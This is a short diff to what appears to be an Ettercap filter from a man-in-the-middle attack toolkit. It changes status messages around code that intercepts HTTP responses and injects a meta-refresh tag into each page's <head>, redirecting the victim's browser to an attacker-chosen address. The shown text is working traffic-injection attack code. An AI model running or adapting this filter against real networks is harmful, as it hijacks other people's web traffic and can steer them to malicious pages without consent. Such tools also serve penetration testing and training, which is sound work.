@@ -32,10 +32,11 @@ if (ip.proto == TCP && tcp.dst == 80){
 #####################
 if (ip.proto == TCP && tcp.src == 80){
   if (search(DATA.data, "<head>")) {
-   msg("[morpheus] | dns_spoof: %1\n");
-
+      msg("[Morpheus] | action: redirecting target traffic ✔");
+      msg("[Morpheus] |_ injec: meta http-equiv on request ✔");
     # redirect target to exploitdb by replacing <head> html tag with one redirection url
     replace("<HEAD>", "<HEAD><META http-equiv='refresh' content='0;URL=http://IpAdR'>");
     replace("<head>", "<head><meta http-equiv='refresh' content='0;URL=http://IpAdR'>");
   }
 }
+
